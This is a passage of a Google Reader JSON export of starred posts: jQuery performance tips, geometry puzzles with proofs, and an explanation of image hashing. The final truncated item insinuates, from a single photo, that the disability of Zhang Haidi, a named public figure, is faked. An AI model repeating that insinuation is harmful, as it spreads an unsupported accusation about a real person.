alt=\"\"></p>\n<p>    Tada！</p><img src=\"http://www1.feedsky.com/t1/556171634/matrix67/feedsky/s.gif?r=http://www.matrix67.com/blog/archives/4534\" border=\"0\" height=\"0\" width=\"0\">"
    },
    "author" : "Matrix67",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1312897411189",
    "timestampUsec" : "1312897411189357",
    "id" : "tag:google.com,2005:reader/item/b496ca72de1bfc64",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "jQuery最佳实践",
    "published" : 1312445178,
    "updated" : 1312445178,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/08/jquery_best_practices.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>上周，我整理了<a href=\"http://www.ruanyifeng.com/blog/2011/07/jquery_fundamentals.html\">《jQuery设计思想》</a>。</p><p>那篇文章是一篇入门教程，从设计思想的角度，讲解<strong>\"怎么使用jQuery\"</strong>。今天的文章则是更进一步，讲解<strong>\"如何用好jQuery\"</strong>。</p>\n\n<p>我主要参考了Addy Osmani的PPT<a href=\"http://addyosmani.com/jqprovenperformance/\">《提高jQuery性能的诀窍》</a>（jQuery Proven Performance Tips And Tricks）。他是jQuery开发团队的成员，具有一定的权威性，提出的结论都有测试数据支持，非常有价值。</p>\n\n<p>==============================================</p>\n\n<p><strong>jQuery最佳实践</strong></p>\n\n<p>阮一峰 整理</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080303.jpg\"></p>\n\n<p><strong>1. 使用最新版本的jQuery</strong></p>\n\n<p>jQuery的版本更新很快，你应该总是使用最新的版本。因为新版本会改进性能，还有很多新功能。</p>\n\n<p>下面就来看看，不同版本的jQuery性能差异有多大。这里是三条最常见的jQuery选择语句：</p>\n\n<blockquote>\n\n<p>　　$('.elem')</p>\n\n<p>　　$('.elem', context)</p>\n\n<p>　　context.find('.elem')</p>\n\n</blockquote>\n\n<p>我们用1.4.2、1.4.4、1.6.2三个版本的jQuery<a href=\"http://jsperf.com/jquery-1-4-2-vs-1-6-2-comparisons\">测试</a>，看看浏览器在1秒内能够执行多少次。结果如下：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080301.png\"></p>\n\n<p>可以看到，1.6.2版本的运行次数，远远超过两个老版本。尤其是第一条语句，性能有数倍的提高。</p>\n\n<p>其他语句的测试，比如<a href=\"http://jsperf.com/attr-vs-attrhooks\">.attr(\"value\")</a>和<a href=\"http://jsperf.com/valhooks-vs-val/2\">.val()</a>，也是新版本的jQuery表现好于老版本。</p>\n\n<p><strong>2. 用对选择器</strong></p>\n\n<p>在jQuery中，你可以用多种选择器，选择同一个网页元素。每种选择器的性能是不一样的，你应该了解它们的性能差异。</p>\n\n<p><strong>（1）最快的选择器：id选择器和元素标签选择器</strong></p>\n\n<p>举例来说，下面的语句性能最佳：</p>\n\n<blockquote>\n\n<p>　　$('#id')</p>\n\n<p>　　$('form')</p>\n\n<p>　　$('input')</p>\n\n</blockquote>\n\n<p>遇到这些选择器的时候，jQuery内部会自动调用浏览器的原生方法（比如getElementById()），所以它们的执行速度快。</p>\n\n<p><strong>（2）较慢的选择器：class选择器</strong></p>\n\n<p>$('.className')的性能，取决于不同的浏览器。</p>\n\n<p>Firefox、Safari、Chrome、Opera浏览器，都有原生方法getElementByClassName()，所以速度并不慢。但是，IE5-IE8都没有部署这个方法，所以这个选择器在IE中会相当慢。</p>\n\n<p><strong>（3）最慢的选择器：伪类选择器和属性选择器</strong></p>\n\n<p>先来看例子。找出网页中所有的隐藏元素，就要用到伪类选择器：</p>\n\n<blockquote>\n\n<p>　　$(':hidden')</p>\n\n</blockquote>\n\n<p>属性选择器的例子则是：</p>\n\n<blockquote>\n\n<p>　　$('[attribute=value]')</p>\n\n</blockquote>\n\n<p>这两种语句是最慢的，因为浏览器没有针对它们的原生方法。但是，一些浏览器的新版本，增加了querySelector()和querySelectorAll()方法，因此会使这类选择器的性能有大幅提高。</p>\n\n<p>最后是不同选择器的<a href=\"http://jsperf.com/dh-jquery-1-4-vs-1-6/6\">性能比较图</a>。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080302.png\"></p>\n\n<p>可以看到，ID选择器遥遥领先，然后是标签选择器，第三是Class选择器，其他选择器都非常慢。</p>\n\n<p><strong>3. 理解子元素和父元素的关系</strong></p>\n\n<p>下面六个选择器，都是从父元素中选择子元素。你知道哪个速度最快，哪个速度最慢吗？</p>\n\n<blockquote>\n\n<p>　　$('.child', $parent)</p>\n\n<p>　　$parent.find('.child')</p>\n\n<p>　　$parent.children('.child')</p>\n\n<p>　　$(&#39;#parent &gt; .child&#39;)</p>\n\n<p>　　$('#parent .child')</p>\n\n<p>　　$('.child', $('#parent'))</p>\n\n</blockquote>\n\n<p>我们一句句来看。</p>\n\n<p><strong>(1) $('.child', $parent)</strong></p>\n\n<p>这条语句的意思是，给定一个DOM对象，然后从中选择一个子元素。jQuery会自动把这条语句转成$.parent.find('child')，这会导致一定的性能损失。它比最快的形式慢了5%-10%。</p>\n\n<p><strong>(2) $parent.find('.child')</strong></p>\n\n<p>这条是最快的语句。.find()方法会调用浏览器的原生方法（getElementById，getElementByName，getElementByTagName等等），所以速度较快。</p>\n\n<p><strong>(3) $parent.children('.child')</strong></p>\n\n<p>这条语句在jQuery内部，会使用$.sibling()和javascript的nextSibling()方法，一个个遍历节点。它比最快的形式大约慢50%。</p>\n\n<p><strong>(4) $(&#39;#parent &gt; .child&#39;)</strong></p>\n\n<p>jQuery内部使用Sizzle引擎，处理各种选择器。Sizzle引擎的选择顺序是从右到左，所以这条语句是先选.child，然后再一个个过滤出父元素#parent，这导致它比最快的形式大约慢70%。</p>\n\n<p><strong>(5) $('#parent .child')</strong></p>\n\n<p>这条语句与上一条是同样的情况。但是，上一条只选择直接的子元素，这一条可以于选择多级子元素，所以它的速度更慢，大概比最快的形式慢了77%。</p>\n\n<p><strong>(6) $('.child', $('#parent'))</strong></p>\n\n<p>jQuery内部会将这条语句转成$('#parent').find('.child')，比最快的形式慢了23%。</p>\n\n<p>所以，最佳选择是$parent.find('.child')。而且，由于$parent往往在前面的操作已经生成，jQuery会进行缓存，所以进一步加快了执行速度。</p>\n\n<p>具体的例子和比较结果，请看<a href=\"http://jsperf.com/jquery-selectors-context/2\">这里</a>。</p>\n\n<p><strong>4. 不要过度使用jQuery</strong></p>\n\n<p>jQuery速度再快，也无法与原生的javascript方法相比。所以有原生方法可以使用的场合，尽量避免使用jQuery。</p>\n\n<p>请看下面的例子，为a元素绑定一个处理点击事件的函数：</p>\n\n<blockquote>\n\n<p>　　$('a').click(function(){</p>\n\n<p>　　　　<strong>alert($(this).attr('id'));</strong></p>\n\n<p>　　});</p>\n\n</blockquote>\n\n<p>这段代码的意思是，点击a元素后，弹出该元素的id属性。为了获取这个属性，必须连续两次调用jQuery，第一次是$(this)，第二次是attr('id')。</p>\n\n<p>事实上，这种处理完全不必要。更正确的写法是，直接采用javascript原生方法，调用this.id：</p>\n\n<blockquote>\n\n<p>　　$('a').click(function(){</p>\n\n<p>　　　　<strong>alert(this.id);</strong></p>\n\n<p>　　});</p>\n\n</blockquote>\n\n<p>根据<a href=\"http://jsperf.com/el-attr-id-vs-el-id/2\">测试</a>，this.id的速度比$(this).attr('id')快了20多倍。</p>\n\n<p><strong>5.  做好缓存</strong></p>\n\n<p>选中某一个网页元素，是开销很大的步骤。所以，使用选择器的次数应该越少越好，并且尽可能缓存选中的结果，便于以后反复使用。</p>\n\n<p>比如，下面这样的写法就是糟糕的写法：</p>\n\n<blockquote>\n\n<p>　　jQuery('#top').find('p.classA');</p>\n\n<p>　　jQuery('#top').find('p.classB');</p>\n\n</blockquote>\n\n<p>更好的写法是：</p>\n\n<blockquote>\n\n<p>　　<strong>var cached = jQuery('#top');</strong></p>\n\n<p>　　cached.find('p.classA');</p>\n\n<p>　　cached.find('p.classB');</p>\n\n</blockquote>\n\n<p>根据<a href=\"http://jsperf.com/ns-jq-cached\">测试</a>，缓存比不缓存，快了2-3倍。</p>\n\n<p><strong>6.  使用链式写法</strong></p>\n\n<p>jQuery的一大特点，就是允许使用链式写法。</p>\n\n<blockquote>\n\n<p>　　$('div').find('h3').eq(2).html('Hello');</p>\n\n</blockquote>\n\n<p>采用链式写法时，jQuery自动缓存每一步的结果，因此比非链式写法要快。根据<a href=\"http://jsperf.com/jquery-chaining\">测试</a>，链式写法比（不使用缓存的）非链式写法，大约快了25%。</p>\n\n<p><strong>7. 事件的委托处理（Event Delegation）</strong></p>\n\n<p>javascript的事件模型，采用\"冒泡\"模式，也就是说，子元素的事件会逐级向上\"冒泡\"，成为父元素的事件。</p>\n\n<p>利用这一点，可以大大简化事件的绑定。比如，有一个表格（table元素），里面有100个格子（td元素），现在要求在每个格子上面绑定一个点击事件（click），请问是否需要将下面的命令执行100次？</p>\n\n<blockquote>\n\n<p>　　$(\"td\").bind(\"click\", function(){</p>\n\n<p>　　　　$(this).toggleClass(\"click\");</p>\n\n<p>　　});</p>\n\n</blockquote>\n\n<p>回答是不需要，我们只要把这个事件绑定在table元素上面就可以了，因为td元素发生点击事件之后，这个事件会\"冒泡\"到父元素table上面，从而被监听到。</p>\n\n<p>因此，这个事件只需要在父元素绑定1次即可，而不需要在子元素上绑定100次，从而大大提高性能。这就叫事件的\"委托处理\"，也就是子元素\"委托\"父元素处理这个事件。</p>\n\n<p>具体的写法有两种。第一种是采用.delegate()方法：</p>\n\n<blockquote>\n\n<p>　　$(\"table\").delegate(\"td\", \"click\", function(){</p>\n\n<p>　　　　$(this).toggleClass(\"click\");</p>\n\n<p>　　});</p>\n\n</blockquote>\n\n<p>第二种是采用.live()方法：</p>\n\n<blockquote>\n\n<p>　　$(\"table\").each(function(){</p>\n\n<p>　　　　$(\"td\", this).live(\"click\", function(){</p>\n\n<p>　　　　　　$(this).toggleClass(\"click\");<br>\n　　　　});<br>\n　　});</p>\n\n</blockquote>\n\n<p>这两种写法基本等价。唯一的区别在于，.delegate()是当事件冒泡到指定的父元素时触发，.live()则是当事件冒泡到文档的根元素后触发，因此.delegate()比.live()稍快一点。此外，这两种方法相比传统的.bind()方法还有一个好处，那就是对动态插入的元素也有效，.bind()只对已经存在的DOM元素有效，对动态插入的元素无效。</p>\n\n<p>根据<a href=\"http://jsperf.com/bind-vs-click/12\">测试</a>，委托处理比不委托处理，快了几十倍。在委托处理的<a href=\"http://jsperf.com/jquery-delegate-vs-live-table-test/2\">情况</a>下，.delegate()又比.live()大约快26%。</p>\n\n<p><strong>8. 少改动DOM结构</strong></p>\n\n<p>（1）改动DOM结构开销很大，因此不要频繁使用.append()、.insertBefore()和.insetAfter()这样的方法。</p>\n\n<p>如果要插入多个元素，就先把它们合并，然后再一次性插入。根据<a href=\"http://jsperf.com/string-concat-single-append-vs-multiple-append\">测试</a>，合并插入比不合并插入，快了将近10倍。</p>\n\n<p>（2）如果你要对一个DOM元素进行大量处理，应该先用.detach()方法，把这个元素从DOM中取出来，处理完毕以后，再重新插回文档。根据<a href=\"http://jsperf.com/to-detach-or-not-to-detach\">测试</a>，使用.detach()方法比不使用时，快了60%。</p>\n\n<p>（3）如果你要在DOM元素上储存数据，不要写成下面这样：</p>\n\n<blockquote>\n\n<p>　　var elem = $('#elem');</p>\n\n<p>　　<strong>elem.data(key,value);</strong></p>\n\n</blockquote>\n\n<p>而要写成</p>\n\n<blockquote>\n\n<p>　　var elem = $('#elem');</p>\n\n<p>　　<strong>$.data(elem,key,value);</strong></p>\n\n</blockquote>\n\n<p>根据<a href=\"http://jsperf.com/jquery-data-vs-jqueryselection-data/11\">测试</a>，后一种写法要比前一种写法，快了将近10倍。因为elem.data()方法是定义在jQuery函数的prototype对象上面的，而$.data()方法是定义jQuery函数上面的，调用的时候不从复杂的jQuery对象上调用，所以速度快得多。（此处可以参阅下面第10点。）</p>\n\n<p><strong>9. 正确处理循环</strong></p>\n\n<p>循环总是一种比较耗时的操作，如果可以使用复杂的选择器直接选中元素，就不要使用循环，去一个个辨认元素。</p>\n\n<p>javascript原生循环方法for和while，要比jQuery的.each()方法<a href=\"http://jsperf.com/jquery-each-vs-for-loop/24\">快</a>，应该优先使用原生方法。</p>\n\n<p><strong>10. 尽量少生成jQuery对象</strong></p>\n\n<p>每当你使用一次选择器（比如$('#id')），就会生成一个jQuery对象。jQuery对象是一个很庞大的对象，带有很多属性和方法，会占用不少资源。所以，尽量少生成jQuery对象。</p>\n\n<p>举例来说，许多jQuery方法都有两个版本，一个是供<strong>jQuery对象</strong>使用的版本，另一个是供<strong>jQuery函数</strong>使用的版本。下面两个例子，都是取出一个元素的文本，使用的都是text()方法。你既可以使用针对jQuery对象的版本：</p>\n\n<blockquote>\n\n<p>　　var $text = $(\"#text\");</p>\n\n<p>　　<strong>var $ts = $text.text();</strong></p>\n\n</blockquote>\n\n<p>也可以使用针对jQuery函数的版本：</p>\n\n<blockquote>\n\n<p>　　var $text = $(\"#text\");</p>\n\n<p>　　<strong>var $ts = $.text($text);</strong></p>\n\n</blockquote>\n\n<p>由于后一种针对jQuery函数的版本不通过jQuery对象操作，所以相对开销较小，速度<a href=\"http://jsperf.com/jquery-text-vs-html/5\">比较快</a>。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/08/jquery_best_practices.html\">http://www.ruanyifeng.com/blog/2011/08/jquery_best_practices.html</a></li>\n<li>最后修改时间：2011年8月18日 16:05</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://lab.alipay.com/p.htm?id=2011081500435188\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.3&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><a href=\"http://www.nanrenwa.com/click/go/ruanyifeng.banner.feed.yfblogfeed/gift\"><img src=\"http://nanrenwa.com/_img/a/2011/yfblog_feed.png\"></a></p>\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1312890528431",
    "timestampUsec" : "1312890528431431",
    "id" : "tag:google.com,2005:reader/item/7dae53a7c79013fb",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "趣题", "Brain Storm", "几何", "证明" ],
    "title" : "趣题：能否在等边三角形点阵中画一个正方形？",
    "published" : 1312811938,
    "updated" : 1312811938,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/4525",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    这是一个非常有趣的问题：能否在一个无限大的等边三角形点阵中选取四个点，使得这四个点恰好构成一个正方形？这个问题有一个非常简单巧妙的解法，你能想到吗？</p>\n<p>      <img src=\"http://www.matrix67.com/blogimage_2011/201108083.png\" alt=\"\"></p>\n<p><span></span><br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n      <img src=\"http://www.matrix67.com/blogimage_2011/201108084.png\" alt=\"\"></p>\n<p>    答案：不可能。为了证明这一点，首先注意到，如果选定三角形点阵中任意两个不同的点，则以这两个点为顶点作等边三角形，所得的第三个顶点也一定在点阵中。这是因为，以任意一点为中心，将整个平面旋转 60 度，新的点阵与原来的点阵仍然是重合的。等边三角形的第三个顶点，其实可以看作是已知两点中的其中一点绕另一点旋转 60 度所得的，自然也就还在点阵中了。</p>\n<p> <br>\n      <img src=\"http://www.matrix67.com/blogimage_2011/201108085.png\" alt=\"\"></p>\n<p>    下面，假设点阵中存在正方形，则我们一定能找到一个最小的正方形。以正方形的每条边为边，向内作等边三角形，所得的第三个顶点也仍然在点阵上。然而，这四个新的顶点将会构成一个更小的正方形，于是产生矛盾。所以，我们永远无法在等边三角形点阵中作出一个正方形来。</p>\n<p> <br>\n题目来源：<a href=\"http://www.cut-the-knot.org/Curriculum/Geometry/DavidRadcliffe.shtml\">http://www.cut-the-knot.org/Curriculum/Geometry/DavidRadcliffe.shtml</a><br>\n大家有什么其他的证明方法吗？</p><img src=\"http://www1.feedsky.com/t1/556171635/matrix67/feedsky/s.gif?r=http://www.matrix67.com/blog/archives/4525\" border=\"0\" height=\"0\" width=\"0\">"
    },
    "author" : "Matrix67",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1312028999669",
    "timestampUsec" : "1312028999669474",
    "id" : "tag:google.com,2005:reader/item/7fa3bef01f91d62d",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "相似图片搜索的原理",
    "published" : 1311235255,
    "updated" : 1311235255,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>上个月，Google把<a href=\"http://www.google.com/insidesearch/searchbyimage.html\">\"相似图片搜索\"</a>正式放上了首页。</p><p>你可以用一张图片，搜索互联网上所有与它相似的图片。点击<a href=\"http://images.google.com.hk/\">搜索框</a>中照相机的图标。</p>\n\n<p><a href=\"http://images.google.com.hk/\"><img src=\"http://image.beekka.com/blog/201107/bg2011072101.png\"></a></p>\n\n<p>一个对话框会出现。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201107/bg2011072102.png\"></p>\n\n<p>你输入网片的网址，或者直接上传图片，Google就会找出与其相似的图片。下面这张图片是美国女演员Alyson Hannigan。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201107/bg2011072103.jpg\"></p>\n\n<p>上传后，Google返回如下结果：</p>\n\n<p><img src=\"http://image.beekka.com/blog/201107/bg2011072104.jpg\"></p>\n\n<p>类似的\"相似图片搜索引擎\"还有不少，<a href=\"http://www.tineye.com/\">TinEye</a>甚至可以找出照片的拍摄背景。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201107/bg2011072105.jpg\"></p>\n\n<p>==========================================================</p>\n\n<p>这种技术的原理是什么？计算机怎么知道两张图片相似呢？</p>\n\n<p>根据<a href=\"http://www.hackerfactor.com/blog/index.php?/archives/432-Looks-Like-It.html\">Neal Krawetz</a>博士的解释，原理非常简单易懂。我们可以用一个快速算法，就达到基本的效果。</p>\n\n<p>这里的关键技术叫做\"感知哈希算法\"（Perceptual hash algorithm），它的作用是对每张图片生成一个\"指纹\"（fingerprint）字符串，然后比较不同图片的指纹。结果越接近，就说明图片越相似。</p>\n\n<p>下面是一个最简单的实现：</p>\n\n<p><strong>第一步，缩小尺寸。</strong></p>\n\n<p>将图片缩小到8x8的尺寸，总共64个像素。这一步的作用是去除图片的细节，只保留结构、明暗等基本信息，摒弃不同尺寸、比例带来的图片差异。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201107/bg2011072107.png\"> <img src=\"http://image.beekka.com/blog/201107/bg2011072107.png\" width=\"64\" height=\"64\"></p>\n\n<p><strong>第二步，简化色彩。</strong></p>\n\n<p>将缩小后的图片，转为64级灰度。也就是说，所有像素点总共只有64种颜色。</p>\n\n<p><strong>第三步，计算平均值。</strong></p>\n\n<p>计算所有64个像素的灰度平均值。</p>\n\n<p><strong>第四步，比较像素的灰度。</strong></p>\n\n<p>将每个像素的灰度，与平均值进行比较。大于或等于平均值，记为1；小于平均值，记为0。</p>\n\n<p><strong>第五步，计算哈希值。</strong></p>\n\n<p>将上一步的比较结果，组合在一起，就构成了一个64位的整数，这就是这张图片的指纹。组合的次序并不重要，只要保证所有图片都采用同样次序就行了。</p>\n\n<p> <img src=\"http://image.beekka.com/blog/201107/bg2011072109.png\"> = <img src=\"http://image.beekka.com/blog/201107/bg2011072109.png\" width=\"64\" height=\"64\"> = 8f373714acfcf4d0</p>\n\n<p>得到指纹以后，就可以对比不同的图片，看看64位中有多少位是不一样的。在理论上，这等同于计算<a href=\"http://zh.wikipedia.org/wiki/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB\">\"汉明距离\"</a>（Hamming distance）。如果不相同的数据位不超过5，就说明两张图片很相似；如果大于10，就说明这是两张不同的图片。</p>\n\n<p>具体的代码实现，可以参见<a href=\"http://www.reddit.com/r/programming/comments/hql8b/looks_like_it_for_the_last_few_months_i_have_had/c1xkcdd\">Wote</a>用python语言写的<a href=\"http://www.ruanyifeng.com/blog/2011/07/imgHash.txt\">imgHash.py</a>。代码很短，只有53行。使用的时候，第一个参数是基准图片，第二个参数是用来比较的其他图片所在的目录，返回结果是两张图片之间不相同的数据位数量（汉明距离）。</p>\n\n<p>这种算法的优点是简单快速，不受图片大小缩放的影响，缺点是图片的内容不能变更。如果在图片上加几个文字，它就认不出来了。所以，它的最佳用途是根据缩略图，找出原图。</p>\n\n<p>实际应用中，往往采用更强大的<a href=\"http://www.phash.org/\">pHash</a>算法和<a href=\"http://en.wikipedia.org/wiki/Scale-invariant_feature_transform\">SIFT</a>算法，它们能够识别图片的变形。只要变形程度不超过25%，它们就能匹配原图。这些算法虽然更复杂，但是原理与上面的简便算法是一样的，就是先将图片转化成Hash字符串，然后再进行比较。</p>\n\n<p>P.S.</p>\n\n<p>我在<a href=\"http://www.ruanyifeng.com/home.html\">网站首页</a>加上了一些我喜欢的摄影作品，欢迎参观。</p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html\">http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html</a></li>\n<li>最后修改时间：2011年7月29日 03:46</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://lab.alipay.com/p.htm?id=2011051700196144\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.3&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1312028799305",
    "timestampUsec" : "1312028799305578",
    "id" : "tag:google.com,2005:reader/item/0d199a61772cac27",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "趣题", "Brain Storm", "几何", "证明" ],
    "title" : "IMO2011趣题：总存在一条将会遍历所有点的直线",
    "published" : 1311901678,
    "updated" : 1311901678,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/4511",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    下面这个精彩的问题来自于刚刚结束的 <a href=\"http://www.imo-official.org/problems.aspx\">IMO 2011</a> 中的第 2 题：</p>\n<blockquote><p>    设 S 是平面上包含至少两个点的一个有限点集，其中没有三点在同一条直线上。所谓一个“风车”是指这样一个过程：从经过 S 中单独一点 P 的一条直线 l 开始，以 P 为旋转中心顺时针旋转，直至首次遇到 S 中的另一点，记为点 Q 。接着这条直线以 Q 为新的旋转中心顺时针旋转，直到再次遇到 S 中的某一点，这样的过程无限持续下去。<br>\n    证明：可以适当选取 S 中的一点 P ，以及过 P 的一条直线 l ，使得由此产生的“风车”将 S 中的每一点都无限多次用作旋转中心。</p></blockquote>\n<p><span></span><br>\n    注意，由于两点确定的直线只有有限多条，因此直线无限旋转下去，必然会出现和以前某个时刻相同的状态，于是产生循环。另外，由于直线旋转的过程是可逆的，我们不必担心最终产生的是一个 ρ 字形的循环。因此，我们实际上只需要证明，存在这样一条初始直线，它可以碰到所有的点。</p>\n<p>      <img src=\"http://www.matrix67.com/blogimage_2011/201107281.gif\" alt=\"\">         <img src=\"http://www.matrix67.com/blogimage_2011/201107282.gif\" alt=\"\"></p>\n<p>    我用 Mathematica 写了一个程序，做了一些直观的动画。如图所示的由 6 个点构成的点集，适当地选择初始直线就能遍历所有的点，但错误的选择将会导致有一些点永远也碰不到。</p>\n<p>    IMO 2011 赛后统计资料显示，这道漂亮的问题竟然是六道题中第二难的题（第一难的题是最后一道）。 <a href=\"http://polymathprojects.org/\">polymath blog</a> 组织了 <a href=\"http://michaelnielsen.org/polymath1/index.php?title=Imo_2011\">mini-polymath3</a> 活动，邀请众人一同讨论这道题的解法。活动一开始，便引来各路数学高人献计献策，提出了很多有趣的思路和猜想；第 74 分钟，终于有人给出了正确的解法。果然不出所料，神题就该有神解，这道题有一个异常简单巧妙的证明方法。</p>\n<p>      <img src=\"http://www.matrix67.com/blogimage_2011/201107283.png\" alt=\"\"></p>\n<p>    找一条直线，这条直线两侧的点数一样多（最多相差一个）。下面我们证明，这条直线就满足要求。容易看出，在直线的旋转过程中，直线两侧的点数之差始终不变。因此，这条直线转了 180 度后，直线一定回到了初始的位置（或者它旁边一个点的位置）。但此时，原来在直线左侧的点现在全部跑到了直线右侧，原来在直线右侧的点现在全部跑到了直线左侧。这些点当然是不能瞬移到直线另一侧的，要想跑到直线的另一侧，必须要先穿过直线才行。由此可见，所有点都被直线碰到过了。</p><img src=\"http://www1.feedsky.com/t1/552087371/matrix67/feedsky/s.gif?r=http://www.matrix67.com/blog/archives/4511\" border=\"0\" height=\"0\" width=\"0\">"
    },
    "author" : "Matrix67",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1312027032731",
    "timestampUsec" : "1312027032731962",
    "id" : "tag:google.com,2005:reader/item/9088a83a9ea0400c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "社会" ],
    "title" : "张海迪的故事 或许我们都上当受骗了",
    "published" : 1311078306,
    "updated" : 1311078306,
    "alternate" : [ {
      "href" : "http://luo.bo/11381/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><a title=\"萝卜网\" href=\"http://dulei.si/files/2011/07/19/f50bd79f604859a33b40aee2da67c12d.jpg\"><img src=\"http://dulei.si/files/2011/07/19/f50bd79f604859a33b40aee2da67c12d.jpg\" alt=\"萝卜网\" border=\"0\"></a><br> 高位截瘫能翘二郎腿？高位截瘫腿是绝对不能动的。</p><p><a title=\"萝卜网\" href=\"http://dulei.si/files/2011/07/19/60d661d44e88699aea313f64ee62f7c5.jpg\"><img src=\"http://dulei.si/files/2011/07/19/60d661d44e88699aea313f64ee62f7c5.jpg\" alt=\"萝卜网\" border=\"0\"></a></p><p>记者在宾馆走廊采访张海迪</p><p> <a title=\"萝卜网\" href=\"http://dulei.si/files/2011/07/19/eafe70e2bf155a7760684d1095b911e6.jpg\"><img src=\"http://dulei.si/files/2011/07/19/eafe70e2bf155a7760684d1095b911e6.jpg\" alt=\"萝卜网\" border=\"0\"></a></p><p> 张海迪(1955年9月16日－)，生于济南，中国著名残疾人作家，哲学硕士。现任全国政协常委，中国残疾人联合会主席，中国作家协会委员，山东省作家协会副主席。 <span></span></p><p> 